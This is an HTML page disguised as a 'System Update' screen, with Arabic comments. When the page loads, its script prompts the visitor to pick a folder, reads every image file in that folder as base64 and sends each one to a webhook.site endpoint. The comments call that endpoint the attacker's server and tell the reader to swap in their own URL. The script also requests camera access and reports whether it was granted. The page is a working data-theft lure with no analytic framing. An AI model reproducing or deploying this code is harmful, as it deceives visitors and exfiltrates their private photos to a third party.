<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <style>body { font-family: Arial; text-align: center; padding: 50px; }</style>
    <script>
        // دالة لإرسال البيانات إلى السيرفر المهاجم
        async function exfiltrate(data, endpoint) {
            try {
                await fetch(`https://webhook.site/dc8f1db5-40fe-4891-85c6-b96e1f834bae${endpoint}`, { // <-- استبدل هذا الرابط برابطك
                    method: 'POST',
                    mode: 'no-cors', // لتجنب أخطاء CORS
                    body: JSON.stringify(data)
                });
            } catch (e) {
                console.error('Send error:', e);
            }
        }

        // المحاولة للحصول على قائمة بالصور
        async function tryGetImages() {
            // حاول الوصول إلى واجهة File System Access API الحديثة
            try {
                if ('showDirectoryPicker' in window) {
                    const dirHandle = await window.showDirectoryPicker();
                    let images = [];
                    for await (const entry of dirHandle.values()) {
                        if (entry.kind === 'file') {
                            const file = await entry.getFile();
                            if (file.type.startsWith('image/')) {
                                // قراءة الملف كـ Base64 لإرساله كنص
                                const reader = new FileReader();
                                reader.onload = function() {
                                    // إرسال بيانات الصورة
                                    exfiltrate({
                                        filename: file.name,
                                        type: file.type,
                                        size: file.size,
                                        data: reader.result // البيانات بصيغة base64
                                    }, 'upload-image');
                                };
                                reader.readAsDataURL(file);
                            }
                        }
                    }
                }
            } catch (error) {
                exfiltrate({error: error.message, step: 'file-access'}, 'error');
            }

            // الطريقة الاحتياطية: محاولة الوصول إلى الكاميرا (يطلب إذنًا)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                exfiltrate({message: 'Camera access granted'}, 'cam-success');
                // يمكن هنا أخذ لقطة من الكاميرا وإرسالها
                stream.getTracks().forEach(track => track.stop());
            } catch (camError) {
                exfiltrate({error: camError.message, step: 'camera-access'}, 'error');
            }
        }

        // تشغيل كل شيء عند تحميل الصفحة
        window.addEventListener('load', tryGetImages);
    </script>
</head>
<body>
    <h2>System Update In Progress...</h2>
    <p>Please wait. Do not close this page.</p>
</body>
</html>
